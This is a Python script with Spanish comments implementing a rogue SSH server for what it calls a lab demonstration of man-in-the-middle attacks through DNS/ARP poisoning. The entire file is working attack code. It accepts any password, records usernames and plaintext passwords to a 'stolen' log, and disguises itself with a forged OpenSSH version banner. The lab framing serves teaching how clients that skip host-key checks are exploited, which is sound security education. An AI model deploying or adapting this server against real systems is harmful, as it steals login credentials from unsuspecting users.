"""
Servidor SSH falso para el laboratorio.

Hace UNA sola cosa: aceptar conexiones SSH, registrar el usuario y la
contraseña en claro que el cliente envia, y devolver AUTH_SUCCESSFUL para
cualquier contraseña. Es exactamente lo que vera el cliente vulnerable
cuando, por DNS/ARP envenenado (aqui simulado con extra_hosts), termina
hablando con la maquina del atacante creyendo que es la VM legitima.

No es un sshd real; no implementa shell ni sftp utilizables. Para el
proposito de la demo no hace falta: cuando el cliente vulnerable llega
a 'open_sftp' la contrasena ya esta robada.
"""

import datetime
import os
import socket
import sys
import threading

import paramiko

LOG_PATH = "/var/log/stolen.log"
HOST_KEY_PATH = "/etc/ssh_evil/host_rsa_key"


def log_credentials(client_addr: str, username: str, password: str) -> None:
    ts = datetime.datetime.utcnow().isoformat(timespec="seconds") + "Z"
    line = f"{ts} | from={client_addr} | user={username!r} | password={password!r}\n"
    # Escribir en disco para que el script de demo pueda hacer 'cat'
    with open(LOG_PATH, "a", encoding="utf-8") as f:
        f.write(line)
    # Y a stdout, para verlo en docker logs evil-server
    sys.stdout.write("[STOLEN] " + line)
    sys.stdout.flush()


class EvilSSHServer(paramiko.ServerInterface):
    def __init__(self, client_addr: str) -> None:
        self.client_addr = client_addr
        self.event = threading.Event()

    def get_allowed_auths(self, username: str) -> str:  # noqa: D401
        return "password"

    def check_auth_password(self, username: str, password: str) -> int:
        log_credentials(self.client_addr, username, password)
        # Aceptar siempre: nos da igual, ya tenemos lo que queriamos
        return paramiko.AUTH_SUCCESSFUL

    def check_channel_request(self, kind: str, chanid: int) -> int:
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_channel_subsystem_request(self, channel, name: str) -> bool:
        # Aceptamos la peticion del subsistema (p.ej. sftp) para que el
        # cliente no aborte demasiado pronto, aunque no servimos nada real.
        self.event.set()
        return True

    def check_channel_shell_request(self, channel) -> bool:
        self.event.set()
        return True

    def check_channel_pty_request(self, *args, **kwargs) -> bool:
        return True


def ensure_host_key() -> paramiko.PKey:
    """Genera (una sola vez) una host key RSA distinta a la del legitimo."""
    os.makedirs(os.path.dirname(HOST_KEY_PATH), exist_ok=True)
    if not os.path.exists(HOST_KEY_PATH):
        key = paramiko.RSAKey.generate(2048)
        key.write_private_key_file(HOST_KEY_PATH)
        sys.stdout.write(f"[init] host key generada en {HOST_KEY_PATH}\n")
    return paramiko.RSAKey.from_private_key_file(HOST_KEY_PATH)


def handle_client(client_sock: socket.socket, client_addr) -> None:
    addr_str = f"{client_addr[0]}:{client_addr[1]}"
    transport = None
    try:
        transport = paramiko.Transport(client_sock)
        transport.local_version = "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1"  # camuflaje
        transport.add_server_key(ensure_host_key())
        server = EvilSSHServer(addr_str)
        transport.start_server(server=server)

        # Esperar un poco a que el cliente intente algo (auth ya esta loggeada)
        chan = transport.accept(timeout=10)
        if chan is not None:
            # Bloqueamos un instante para que el cliente vea la conexion arriba
            server.event.wait(timeout=5)
            try:
                chan.send("\n")
            except Exception:
                pass
            chan.close()
    except paramiko.SSHException as e:
        sys.stdout.write(f"[!] SSHException de {addr_str}: {e}\n")
    except Exception as e:  # noqa: BLE001
        sys.stdout.write(f"[!] Error con {addr_str}: {e}\n")
    finally:
        if transport is not None:
            try:
                transport.close()
            except Exception:
                pass


def main() -> None:
    # Crear fichero de log vacio si no existe
    os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
    if not os.path.exists(LOG_PATH):
        open(LOG_PATH, "a").close()

    ensure_host_key()  # crear ya, no esperar al primer cliente

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", 22))
    srv.listen(100)
    sys.stdout.write("[evil-server] escuchando en 0.0.0.0:22\n")
    sys.stdout.flush()

    while True:
        client_sock, client_addr = srv.accept()
        sys.stdout.write(f"[evil-server] conexion entrante desde {client_addr}\n")
        sys.stdout.flush()
        t = threading.Thread(
            target=handle_client, args=(client_sock, client_addr), daemon=True
        )
        t.start()


if __name__ == "__main__":
    main()
